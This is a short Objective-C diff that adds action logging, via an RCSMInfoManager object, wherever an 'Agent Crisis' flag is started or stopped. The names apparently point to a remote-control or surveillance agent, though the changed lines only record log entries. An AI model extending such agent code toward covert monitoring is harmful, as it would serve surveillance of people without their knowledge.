@@ -1269,7 +1269,10 @@ static NSLock *gSyncLock                  = nil;
         NSLog(@"%s: Starting Agent Crisis", __FUNCTION__);
 #endif
         gAgentCrisis |= CRISIS_START;
-      
+
+        RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+        [infoManager logActionWithDescription: @"Crisis started"];
+        [infoManager release];
 
         break;
       }
@@ -1674,7 +1677,11 @@ static NSLock *gSyncLock                  = nil;
         NSLog(@"%s: Stopping Agent Crisis", __FUNCTION__);
 #endif
         gAgentCrisis &= ~CRISIS_STARTSTOP;
-        
+
+        RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+        [infoManager logActionWithDescription: @"Crisis stopped"];
+        [infoManager release];
+
         break;
       }
     default:
@@ -2330,7 +2337,11 @@ static NSLock *gSyncLock                  = nil;
                 NSLog(@"%s: Starting Agent Crisis", __FUNCTION__);
 #endif
                 gAgentCrisis |= CRISIS_START;                
-                
+
+                RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+                [infoManager logActionWithDescription: @"Crisis starting"];
+                [infoManager release];
+
                 break;
               }
             default:
@@ -2701,7 +2712,11 @@ static NSLock *gSyncLock                  = nil;
                 NSLog(@"%s: Stopping Agent Crisis", __FUNCTION__);
 #endif
                 gAgentCrisis &= ~CRISIS_STARTSTOP;
-                
+
+                RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+                [infoManager logActionWithDescription: @"Crisis stopped"];
+                [infoManager release];
+
                 break;
               }
             default:
